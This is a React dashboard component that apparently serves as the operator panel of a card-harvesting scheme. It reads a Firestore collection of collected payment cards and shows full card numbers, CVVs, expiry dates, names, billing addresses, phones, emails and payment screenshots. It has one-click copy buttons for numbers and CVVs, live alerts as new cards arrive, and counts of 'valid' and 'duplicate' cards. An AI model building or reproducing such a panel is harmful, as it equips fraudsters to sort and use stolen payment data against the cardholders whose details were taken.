import { useState, useEffect } from 'react';
import { collection, getDocs, doc, deleteDoc, onSnapshot } from 'firebase/firestore';
import { db } from '../../../firbase.config';
import { FaCreditCard, FaCalendarAlt, FaLock, FaSearch, FaInfoCircle, FaFilter, FaTrash, FaBell, FaImage } from 'react-icons/fa';
import { FiCopy } from 'react-icons/fi';
import { toast, ToastContainer } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';
import { useNavigate } from 'react-router-dom';

// Card brand logos component
const CardBrandLogo = ({ type }) => {
    const logoStyle = "h-6 w-auto ml-2";

    switch (type) {
        case 'visa':
            return (
                <svg className={logoStyle} viewBox="0 0 24 24">
                    <path fill="#1A1F71" d="M9.6 15.4h-2l1.3-8.2h2l-1.3 8.2zm4.5 0h-1.9l1.3-8.2h1.9l-1.3 8.2zm3.6-8.2h-1.6c-.4 0-.7.2-.8.6l-2.3 7.6h2l.4-1.1h2.3l.2 1.1h1.7l-1.9-8.2zm-3.1 5.5l.6-1.7.3 1.7h-.9zm5.7-5.5h-2l-1.3 8.2h2l1.3-8.2z" />
                </svg>
            );
        case 'mastercard':
            return (
                <svg className={logoStyle} viewBox="0 0 24 24">
                    <path fill="#FF5F00" d="M15.2 12c0-1.4-.5-2.7-1.3-3.7C13 7.2 11.6 6.5 10 6.5c-1.6 0-3 .7-3.9 1.8-.8 1-1.3 2.3-1.3 3.7s.5 2.7 1.3 3.7c.9 1.1 2.3 1.8 3.9 1.8 1.6 0 3-.7 3.9-1.8.8-1 1.3-2.3 1.3-3.7z" />
                    <path fill="#EB001B" d="M5.8 9.2C4.7 10.4 4 12 4 13.8s.7 3.4 1.8 4.6c1.1 1.2 2.7 1.9 4.4 1.9 1.7 0 3.3-.7 4.4-1.9 1.1-1.2 1.8-2.8 1.8-4.6s-.7-3.4-1.8-4.6C13.5 6.7 11.9 6 10.2 6c-1.7 0-3.3.7-4.4 1.9z" />
                    <path fill="#F79E1B" d="M15.2 12c0 1.8-.7 3.4-1.8 4.6 1.1 1.2 2.7 1.9 4.4 1.9 1.7 0 3.3-.7 4.4-1.9 1.1-1.2 1.8-2.8 1.8-4.6s-.7-3.4-1.8-4.6C21.3 6.7 19.7 6 18 6c-1.7 0-3.3.7-4.4 1.9 1.1 1.2 1.8 2.8 1.8 4.6z" />
                </svg>
            );
        case 'amex':
            return (
                <svg className={logoStyle} viewBox="0 0 24 24">
                    <path fill="#002663" d="M4 6h16v12H4V6zm1 1v10h14V7H5zm3 2h8v1H8V9zm0 2h8v1H8v-1zm0 2h8v1H8v-1z" />
                </svg>
            );
        case 'discover':
            return (
                <svg className={logoStyle} viewBox="0 0 24 24">
                    <path fill="#FF6000" d="M12 6c3.3 0 6 2.7 6 6s-2.7 6-6 6-6-2.7-6-6 2.7-6 6-6zm0-1C7.6 5 4 8.6 4 13s3.6 8 8 8 8-3.6 8-8-3.6-8-8-8zm3.5 6.5h-7v3h7v-3z" />
                    <path fill="#FF6000" d="M12 8.5c-2.5 0-4.5 2-4.5 4.5s2 4.5 4.5 4.5 4.5-2 4.5-4.5-2-4.5-4.5-4.5zm0 7c-1.4 0-2.5-1.1-2.5-2.5s1.1-2.5 2.5-2.5 2.5 1.1 2.5 2.5-1.1 2.5-2.5 2.5z" />
                </svg>
            );
        default:
            return null;
    }
};

// Function to detect card type based on card number
const detectCardType = (cardNumber) => {
    if (!cardNumber) return null;

    // Visa
    if (/^4/.test(cardNumber)) return 'visa';

    // Mastercard
    if (/^5[1-5]/.test(cardNumber)) return 'mastercard';

    // Amex
    if (/^3[47]/.test(cardNumber)) return 'amex';

    // Discover
    if (/^6(?:011|5)/.test(cardNumber)) return 'discover';

    return null;
};

const Dashboard = () => {
    const [cards, setCards] = useState([]);
    const [loading, setLoading] = useState(true);
    const [searchTerm, setSearchTerm] = useState('');
    const [selectedCard, setSelectedCard] = useState(null);
    const [showModal, setShowModal] = useState(false);
    const [dateFilter, setDateFilter] = useState('');
    const [deletingId, setDeletingId] = useState(null);
    const [notifications, setNotifications] = useState([]);
    const navigate = useNavigate();

    // Load notifications from localStorage on component mount
    useEffect(() => {
        const savedNotifications = localStorage.getItem('cardNotifications');
        if (savedNotifications) {
            const parsedNotifications = JSON.parse(savedNotifications);
            setNotifications(parsedNotifications);

            // Show existing notifications from localStorage
            parsedNotifications.forEach(notification => {
                showToastNotification(notification.card, notification.id);
            });
        }
    }, []);

    // Save notifications to localStorage whenever they change
    useEffect(() => {
        localStorage.setItem('cardNotifications', JSON.stringify(notifications));
    }, [notifications]);

    useEffect(() => {
        const fetchCards = async () => {
            try {
                const querySnapshot = await getDocs(collection(db, 'all-cards-info'));
                const cardsData = [];

                querySnapshot.forEach((doc) => {
                    cardsData.push({
                        id: doc.id,
                        ...doc.data()
                    });
                });

                // Sort cards by timestamp (newest first)
                cardsData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                setCards(cardsData);
                setLoading(false);
            } catch (error) {
                console.error('Error fetching cards:', error);
                setLoading(false);
                toast.error('Failed to load card data');
            }
        };

        fetchCards();

        // Set up real-time listener for new cards
        const unsubscribe = onSnapshot(collection(db, 'all-cards-info'), (snapshot) => {
            snapshot.docChanges().forEach((change) => {
                if (change.type === 'added') {
                    const newCard = {
                        id: change.doc.id,
                        ...change.doc.data()
                    };

                    // Check if this is a brand new card (not initial load)
                    if (!cards.some(card => card.id === newCard.id)) {
                        showNewCardNotification(newCard);
                    }
                }
            });
        });

        return () => unsubscribe();
    }, [cards]);

    const showNewCardNotification = (newCard) => {
        // Check if notification already exists for this card
        const notificationExists = notifications.some(
            notification => notification.card.id === newCard.id
        );

        if (!notificationExists) {
            const notificationId = `new-card-${newCard.id}-${Date.now()}`;
            const newNotification = {
                id: notificationId,
                card: newCard,
                timestamp: new Date().toISOString()
            };

            // Add to notifications state
            setNotifications(prev => [...prev, newNotification]);

            // Show the toast
            showToastNotification(newCard, notificationId);
        }
    };

    const showToastNotification = (card, notificationId) => {
        toast.info(
            <div
                className="cursor-pointer"
                onClick={() => {
                    toast.dismiss(notificationId);
                    removeNotification(notificationId);
                    navigate('/dashboard');
                    setTimeout(() => {
                        setSelectedCard(card);
                        setShowModal(true);
                    }, 100);
                }}
            >
                <div className="flex items-start">
                    <FaBell className="text-blue-500 mr-2 mt-1" />
                    <div>
                        <p className="font-bold">New Card Added</p>
                        <p className="text-sm">Card: {card.cardNumber}</p>
                        <p className="text-xs text-gray-500">
                            {new Date(card.timestamp).toLocaleString()}
                        </p>
                    </div>
                </div>
            </div>,
            {
                position: "bottom-right",
                autoClose: false,
                closeOnClick: false,
                pauseOnHover: true,
                draggable: false,
                closeButton: true,
                onClose: () => removeNotification(notificationId),
                toastId: notificationId
            }
        );
    };

    const removeNotification = (notificationId) => {
        setNotifications(prev => prev.filter(n => n.id !== notificationId));
        toast.dismiss(notificationId);
    };

    const filteredCards = cards.filter(card => {
        // Filter by card number if search term exists
        const matchesSearch = searchTerm
            ? card.id.includes(searchTerm.replace(/\s/g, ''))
            : true;

        // Filter by date if date filter exists
        let matchesDate = true;
        if (dateFilter) {
            const cardDate = new Date(card.timestamp);
            const filterDate = new Date(dateFilter);

            matchesDate =
                cardDate.getFullYear() === filterDate.getFullYear() &&
                cardDate.getMonth() === filterDate.getMonth() &&
                cardDate.getDate() === filterDate.getDate();
        }

        return matchesSearch && matchesDate;
    });

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        toast.success('Copied to clipboard!');
    };

    const openCardDetails = (card) => {
        setSelectedCard(card);
        setShowModal(true);
    };

    const closeModal = () => {
        setShowModal(false);
        setSelectedCard(null);
    };

    const resetFilters = () => {
        setSearchTerm('');
        setDateFilter('');
    };

    const deleteCard = async (cardId) => {
        if (window.confirm('Are you sure you want to delete this card? This action cannot be undone.')) {
            try {
                setDeletingId(cardId);
                await deleteDoc(doc(db, 'all-cards-info', cardId));
                setCards(cards.filter(card => card.id !== cardId));

                // Also remove any notifications for this card
                setNotifications(prev => prev.filter(n => n.card.id !== cardId));

                toast.success('Card deleted successfully');
            } catch (error) {
                console.error('Error deleting card:', error);
                toast.error('Failed to delete card');
            } finally {
                setDeletingId(null);
            }
        }
    };

    if (loading) {
        return (
            <div className="flex justify-center items-center h-64">
                <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500"></div>
            </div>
        );
    }

    return (
        <div className="p-6">
            <ToastContainer
                position="bottom-right"
                autoClose={false}
                newestOnTop
                closeOnClick={false}
                rtl={false}
                pauseOnFocusLoss
                draggable={false}
            />

            <h1 className="text-2xl font-bold text-gray-800 mb-6">Bank Card Information Dashboard</h1>

            {/* Search Bar and Filters */}
            <div className="mb-6 grid grid-cols-1 md:grid-cols-3 gap-4">
                {/* Card Number Search */}
                <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                        <FaSearch className="text-gray-400" />
                    </div>
                    <input
                        type="text"
                        placeholder="Search by card number..."
                        className="pl-10 pr-4 py-2 w-full border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                        value={searchTerm}
                        onChange={(e) => setSearchTerm(e.target.value)}
                    />
                </div>

                {/* Date Filter */}
                <div className="relative">
                    <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                        <FaCalendarAlt className="text-gray-400" />
                    </div>
                    <input
                        type="date"
                        className="pl-10 pr-4 py-2 w-full border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500"
                        value={dateFilter}
                        onChange={(e) => setDateFilter(e.target.value)}
                    />
                </div>

                {/* Reset Filters Button */}
                <button
                    onClick={resetFilters}
                    className="px-4 py-2 bg-gray-200 text-gray-700 rounded-lg hover:bg-gray-300 flex items-center justify-center"
                >
                    <FaFilter className="mr-2" />
                    Reset Filters
                </button>
            </div>

            {/* Stats Cards */}
            <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
                <div className="bg-white p-4 rounded-lg shadow border-l-4 border-blue-500">
                    <h3 className="text-gray-500 text-sm">Total Cards</h3>
                    <p className="text-2xl font-bold">{cards.length}</p>
                </div>
                <div className="bg-white p-4 rounded-lg shadow border-l-4 border-purple-500">
                    <h3 className="text-gray-500 text-sm">Valid Cards</h3>
                    <p className="text-2xl font-bold">
                        {cards.filter(card => !card.isDuplicate).length}
                    </p>
                </div>
                <div className="bg-white p-4 rounded-lg shadow border-l-4 border-yellow-500">
                    <h3 className="text-gray-500 text-sm">Duplicate Cards</h3>
                    <p className="text-2xl font-bold">
                        {cards.filter(card => card.isDuplicate).length}
                    </p>
                </div>
                <div className="bg-white p-4 rounded-lg shadow border-l-4 border-green-500">
                    <h3 className="text-gray-500 text-sm">Today's Cards</h3>
                    <p className="text-2xl font-bold">
                        {cards.filter(card => {
                            const cardDate = new Date(card.timestamp);
                            const today = new Date();
                            return (
                                cardDate.getFullYear() === today.getFullYear() &&
                                cardDate.getMonth() === today.getMonth() &&
                                cardDate.getDate() === today.getDate()
                            );
                        }).length}
                    </p>
                </div>
            </div>

            {/* Cards Table */}
            <div className="bg-white rounded-lg shadow overflow-hidden">
                <div className="overflow-x-auto">
                    <table className="min-w-full divide-y divide-gray-200">
                        <thead className="bg-gray-50">
                            <tr>
                                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                    Card Details
                                </th>
                                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                    Expiration
                                </th>
                                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                    Security
                                </th>
                                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                    Status
                                </th>
                                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                    Date Added
                                </th>
                                <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                                    Actions
                                </th>
                            </tr>
                        </thead>
                        <tbody className="bg-white divide-y divide-gray-200">
                            {filteredCards.length > 0 ? (
                                filteredCards.map((card) => {
                                    const cardType = detectCardType(card.cardNumber);
                                    return (
                                        <tr key={card.id} className="hover:bg-gray-50">
                                            <td className="px-6 py-4 whitespace-nowrap">
                                                <div className="flex items-center">
                                                    <div className="flex-shrink-0 h-10 w-10 bg-blue-100 rounded-full flex items-center justify-center">
                                                        <FaCreditCard className="text-blue-600" />
                                                    </div>
                                                    <div className="ml-4">
                                                        <div className="text-sm font-medium text-gray-900 flex items-center">
                                                            {card.cardNumber}
                                                            {cardType && <CardBrandLogo type={cardType} />}
                                                            <button
                                                                onClick={() => copyToClipboard(card.cardNumber)}
                                                                className="ml-2 text-gray-400 hover:text-blue-500"
                                                            >
                                                                <FiCopy size={14} />
                                                            </button>
                                                        </div>
                                                        <div className="text-xs text-gray-500 mt-1">
                                                            {card.cardHolderName || 'No name provided'}
                                                        </div>
                                                    </div>
                                                </div>
                                            </td>
                                            <td className="px-6 py-4 whitespace-nowrap">
                                                <div className="flex items-center">
                                                    <FaCalendarAlt className="text-gray-400 mr-2" />
                                                    <span className="text-sm font-medium text-gray-900">
                                                        {card.expMonth}/{card.expYear}
                                                    </span>
                                                </div>
                                            </td>
                                            <td className="px-6 py-4 whitespace-nowrap">
                                                <div className="flex items-center">
                                                    <FaLock className="text-gray-400 mr-2" />
                                                    <span className="text-sm font-medium text-gray-900">
                                                        CVV: {card.cvv}
                                                        <button
                                                            onClick={() => copyToClipboard(card.cvv)}
                                                            className="ml-2 text-gray-400 hover:text-blue-500"
                                                        >
                                                            <FiCopy size={14} />
                                                        </button>
                                                    </span>
                                                </div>
                                            </td>
                                            <td className="px-6 py-4 whitespace-nowrap">
                                                <span className={`px-3 py-1 inline-flex text-xs leading-5 font-semibold rounded-full 
                                                    ${card.isDuplicate ? 'bg-yellow-100 text-yellow-800' : 'bg-green-100 text-green-800'}`}>
                                                    {card.isDuplicate ? 'Duplicate' : 'Valid'}
                                                </span>
                                            </td>
                                            <td className="px-6 py-4 whitespace-nowrap">
                                                <div className="text-sm text-gray-900">
                                                    {new Date(card.timestamp).toLocaleDateString()}
                                                </div>
                                                <div className="text-xs text-gray-500">
                                                    {new Date(card.timestamp).toLocaleTimeString()}
                                                </div>
                                            </td>
                                            <td className="px-6 py-4 whitespace-nowrap text-sm font-medium">
                                                <button
                                                    onClick={() => openCardDetails(card)}
                                                    className="text-blue-600 hover:text-blue-900 mr-3"
                                                >
                                                    Details
                                                </button>
                                                <button
                                                    onClick={() => deleteCard(card.id)}
                                                    className="text-red-600 hover:text-red-900 flex items-center"
                                                    disabled={deletingId === card.id}
                                                >
                                                    {deletingId === card.id ? (
                                                        'Deleting...'
                                                    ) : (
                                                        <>
                                                            <FaTrash className="mr-1" />
                                                            Delete
                                                        </>
                                                    )}
                                                </button>
                                            </td>
                                        </tr>
                                    );
                                })
                            ) : (
                                <tr>
                                    <td colSpan="6" className="px-6 py-4 text-center text-gray-500">
                                        No cards found matching your search criteria
                                    </td>
                                </tr>
                            )}
                        </tbody>
                    </table>
                </div>
            </div>

            {/* Card Details Modal with Payment Image */}
            {showModal && selectedCard && (
                <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                    <div className="bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
                        <div className="p-6">
                            <div className="flex justify-between items-start">
                                <h3 className="text-lg font-bold text-gray-800">Card Details</h3>
                                <button
                                    onClick={closeModal}
                                    className="text-gray-400 hover:text-gray-500"
                                >
                                    ✕
                                </button>
                            </div>

                            <div className="mt-6 space-y-4">
                                {/* Payment Image Section */}
                                {selectedCard.paymentImage && (
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500 mb-2">
                                            Payment Screenshot
                                        </label>
                                        <div className="border border-gray-200 rounded-lg p-2">
                                            <img
                                                src={selectedCard.paymentImage}
                                                alt="Payment Screenshot"
                                                className="max-w-full h-auto rounded"
                                                onError={(e) => {
                                                    e.target.onerror = null;
                                                    e.target.src = 'https://via.placeholder.com/300x200?text=Image+Not+Available';
                                                }}
                                            />
                                            <div className="mt-2 flex justify-end">
                                                <a
                                                    href={selectedCard.paymentImage}
                                                    target="_blank"
                                                    rel="noopener noreferrer"
                                                    className="text-blue-600 hover:text-blue-800 text-sm flex items-center"
                                                >
                                                    <FaImage className="mr-1" />
                                                    View Full Image
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                )}

                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Card Number</label>
                                        <div className="mt-1 flex items-center">
                                            <p className="text-sm font-medium text-gray-900">
                                                {selectedCard.cardNumber}
                                            </p>
                                            {detectCardType(selectedCard.cardNumber) && (
                                                <CardBrandLogo type={detectCardType(selectedCard.cardNumber)} />
                                            )}
                                            <button
                                                onClick={() => copyToClipboard(selectedCard.cardNumber)}
                                                className="ml-2 text-gray-400 hover:text-blue-500"
                                            >
                                                <FiCopy size={14} />
                                            </button>
                                        </div>
                                    </div>
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Card Type</label>
                                        <p className="mt-1 text-sm font-medium text-gray-900 capitalize">
                                            {detectCardType(selectedCard.cardNumber) || 'Unknown'}
                                        </p>
                                    </div>
                                </div>

                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Expiration</label>
                                        <p className="mt-1 text-sm font-medium text-gray-900">
                                            {selectedCard.expMonth}/{selectedCard.expYear}
                                        </p>
                                    </div>
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">CVV</label>
                                        <p className="mt-1 text-sm font-medium text-gray-900 flex items-center">
                                            {selectedCard.cvv}
                                            <button
                                                onClick={() => copyToClipboard(selectedCard.cvv)}
                                                className="ml-2 text-gray-400 hover:text-blue-500"
                                            >
                                                <FiCopy size={14} />
                                            </button>
                                        </p>
                                    </div>
                                </div>

                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Status</label>
                                        <p className="mt-1">
                                            <span className={`px-3 py-1 inline-flex text-xs leading-5 font-semibold rounded-full 
                                                ${selectedCard.isDuplicate ? 'bg-yellow-100 text-yellow-800' : 'bg-green-100 text-green-800'}`}>
                                                {selectedCard.isDuplicate ? 'Duplicate' : 'Valid'}
                                            </span>
                                        </p>
                                    </div>
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Added On</label>
                                        <p className="mt-1 text-sm text-gray-900">
                                            {new Date(selectedCard.timestamp).toLocaleString()}
                                        </p>
                                    </div>
                                </div>

                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Card ID</label>
                                        <p className="mt-1 text-sm text-gray-900">
                                            {selectedCard.id}
                                        </p>
                                    </div>
                                </div>

                                {selectedCard.cardHolderName && (
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Cardholder Name</label>
                                        <p className="mt-1 text-sm text-gray-900">
                                            {selectedCard.cardHolderName}
                                        </p>
                                    </div>
                                )}

                                {selectedCard.billingAddress && (
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Billing Address</label>
                                        <p className="mt-1 text-sm text-gray-900">
                                            {selectedCard.billingAddress}
                                        </p>
                                    </div>
                                )}

                                {selectedCard.phoneNumber && (
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Phone Number</label>
                                        <p className="mt-1 text-sm text-gray-900">
                                            {selectedCard.phoneNumber}
                                        </p>
                                    </div>
                                )}

                                {selectedCard.email && (
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Email</label>
                                        <p className="mt-1 text-sm text-gray-900">
                                            {selectedCard.email}
                                        </p>
                                    </div>
                                )}

                                {selectedCard.notes && (
                                    <div>
                                        <label className="block text-sm font-medium text-gray-500">Notes</label>
                                        <p className="mt-1 text-sm text-gray-900">
                                            {selectedCard.notes}
                                        </p>
                                    </div>
                                )}

                                <div className="pt-4 border-t border-gray-200 flex justify-between">
                                    <button
                                        onClick={() => {
                                            deleteCard(selectedCard.id);
                                            closeModal();
                                        }}
                                        className="px-4 py-2 bg-red-600 text-white rounded-md hover:bg-red-700 flex items-center"
                                        disabled={deletingId === selectedCard.id}
                                    >
                                        {deletingId === selectedCard.id ? (
                                            'Deleting...'
                                        ) : (
                                            <>
                                                <FaTrash className="mr-2" />
                                                Delete Card
                                            </>
                                        )}
                                    </button>
                                    <button
                                        onClick={closeModal}
                                        className="px-4 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700"
                                    >
                                        Close
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default Dashboard;